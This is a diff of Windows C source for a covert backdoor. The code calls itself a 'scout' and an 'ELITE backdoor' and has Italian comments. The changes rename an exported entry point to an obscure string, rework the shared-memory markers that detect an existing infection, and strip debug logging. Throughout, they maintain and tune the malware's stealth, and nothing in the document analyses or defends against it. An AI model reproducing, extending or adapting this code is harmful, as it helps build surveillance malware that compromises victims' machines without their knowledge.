@@ -34,15 +34,17 @@ HANDLE hScoutSharedMemory;
 
 //#pragma comment(linker, "/EXPORT:MyConf=?MyConf@@YAXXZ")
 //PWCHAR urs73A(PULONG pSynchro) // questa viene richiamata dai meltati
-__declspec(dllexport) PWCHAR urs73A(PULONG pSynchro) // questa viene richiamata dai meltati
+__declspec(dllexport) PWCHAR jfk31d1QQ(PULONG pSynchro) // questa viene richiamata dai meltati
 {
 #ifdef _DEBUG
 	OutputDebugString(L"[+] Setting uMelted to TRUE\n");
 #endif
+	PWCHAR pScoutName;
+	
 	uMelted = TRUE;
 	uSynchro = pSynchro;
 
-	PWCHAR pScoutName = (PWCHAR)VirtualAlloc(NULL, strlen(SCOUT_NAME)*sizeof(WCHAR) + 2*sizeof(WCHAR), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
+	pScoutName = (PWCHAR)VirtualAlloc(NULL, strlen(SCOUT_NAME)*sizeof(WCHAR) + 2*sizeof(WCHAR), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
 	MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, SCOUT_NAME, strlen(SCOUT_NAME), pScoutName, strlen(SCOUT_NAME) + 2);
 
 	return pScoutName;
@@ -64,6 +66,7 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 		return 0;
 	}
 	
+	
 	memcpy(pServerKey, CLIENT_KEY, 32);
 	memcpy(pConfKey, ENCRYPTION_KEY_CONF, 32);
 	memcpy(pLogKey, ENCRYPTION_KEY, 32);
@@ -79,10 +82,8 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 #ifdef _DEBUG
 		OutputDebugString(L"[+] An ELITE backdoor is already installed here!\n");
 #endif
-		if (AmIFromStartup())
-		{
+		if (AmIFromStartup()) // FIXME: questo nn puo' essere.. 
 			DeleteAndDie(FALSE);
-		}
 
 		if (uMelted)
 		{
@@ -143,7 +144,7 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 		ExitThread(0);
 	}
 	
-
+	
 	return 0;
 }
 
@@ -204,7 +205,6 @@ VOID WaitForInput()
 	OutputDebugString(L"[+] FIRST_WAIT\n");
 #endif
 	MySleep(WAIT_INPUT);
-
 
 	pLastInputInfo.cbSize = sizeof(LASTINPUTINFO);
 	GetLastInputInfo(&pLastInputInfo);
@@ -339,13 +339,47 @@ PCHAR GetScoutSharedMemoryName()
 	_snprintf_s(pName, 
 		16, 
 		_TRUNCATE, 
+		"%02X%02X%02X%02X%02X%02X%02X", 
+		pServerKey[6], pServerKey[5], pServerKey[4], pServerKey[3], pServerKey[2], pServerKey[1], pServerKey[0]);
+
+	return pName;
+}
+
+/*
+PCHAR GetOldScoutSharedMemoryName()
+{
+	PCHAR pName = (PCHAR)malloc(16);
+	memset(pName, 0x0, 16);
+
+	_snprintf_s(pName, 
+		16, 
+		_TRUNCATE, 
 		"%02X%02X%02X%02X%c%c", 
 		pServerKey[3], pServerKey[2], pServerKey[1], pServerKey[0], 'B', 'R');
 
 	return pName;
 }
+*/
 
 PCHAR GetEliteSharedMemoryName()
+{
+	PCHAR pName = (PCHAR)malloc(16);
+	memset(pName, 0x0, 16);
+	memcpy(pName, WMARKER, 7);
+
+	/*
+	_snprintf_s(pName, 
+		16, 
+		_TRUNCATE, 
+		//"%cX%X%02X%02X%02X%02X%02X", 
+		"%.7s",
+		WMARKER[0], WMARKER[1], WMARKER[2], WMARKER[3], WMARKER[4], WMARKER[5], WMARKER[6]);
+	*/
+	return pName;
+}
+
+/*
+PCHAR GetOldEliteSharedMemoryName()
 {
 	PCHAR pName = (PCHAR)malloc(16);
 	memset(pName, 0x0, 16);
@@ -358,6 +392,7 @@ PCHAR GetEliteSharedMemoryName()
 
 	return pName;
 }
+*/
 
 BOOL CreateScoutSharedMemory()
 {
@@ -386,54 +421,38 @@ BOOL CreateScoutSharedMemory()
 
 BOOL ExistsScoutSharedMemory()
 {
+	HANDLE hMem;
 	PCHAR pName;
 	BOOL uRet = FALSE;
 
 	pName = GetScoutSharedMemoryName();
-	HANDLE hMem = OpenFileMappingA(FILE_MAP_READ, FALSE, pName);
-
+	hMem = OpenFileMappingA(FILE_MAP_READ, FALSE, pName);
 	if (hMem)
 	{
 		uRet = TRUE;
 		CloseHandle(hMem);
 	}
-
 	free(pName);
+
 	return uRet;
 }
 
 
 BOOL ExistsEliteSharedMemory()
 {
+	HANDLE hMem;
 	PCHAR pName;
 	BOOL uRet = FALSE;
-
+	
 	pName = GetEliteSharedMemoryName();
-
-#ifdef _DEBUG
-	PWCHAR pDebugString = (PWCHAR)malloc(1024 * sizeof(WCHAR));
-	swprintf_s((wchar_t *)pDebugString, 1024, L"[+] Looking for SharedMemory %S\n", pName);
-	OutputDebugString(pDebugString);
-	free(pDebugString);
-#endif
-
-	HANDLE hMem = OpenFileMappingA(FILE_MAP_READ, FALSE, pName);
+	hMem = OpenFileMappingA(FILE_MAP_READ, FALSE, pName);
 	if (hMem)
 	{
 		uRet = TRUE;
 		CloseHandle(hMem);
 	}
-#ifdef _DEBUG
-	else
-	{
-//		PWCHAR pDebugString = (PWCHAR)malloc(1024 * sizeof(WCHAR));
-//		swprintf_s(pDebugString, 1024, L"[+] OpenFileMappingA, hMem: %08x, LastError: %08x\n", hMem, GetLastError());//
-//		OutputDebugString(pDebugString);
-//		free(pDebugString);
-	}
-#endif
-
 	free(pName);
+	
 	return uRet;
 }
 
